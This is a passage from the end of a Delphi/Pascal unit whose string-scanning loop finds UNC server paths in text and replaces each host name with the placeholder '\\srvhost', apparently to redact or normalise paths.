      if (C = '\') and (I + 2 <= L) and (AText[I + 1] = '\') and
         CharInSet(AText[I + 2], ['A'..'Z', 'a'..'z', '0'..'9']) and
         ((I = 1) or CharInSet(AText[I - 1],
            [' ', #9, '"', '''', '(', ',', '=', #10, #13])) then
      begin
        Sb.Append('\\srvhost');
        Inc(I, 2);
        while (I <= L) and not CharInSet(AText[I], ['\', '/', '"', ' ', #9]) do
          Inc(I);
        Continue;
      end;
      Sb.Append(C);
      Inc(I);
    end;
    Result := Sb.ToString;
  finally
    Sb.Free;
  end;
end;

end.
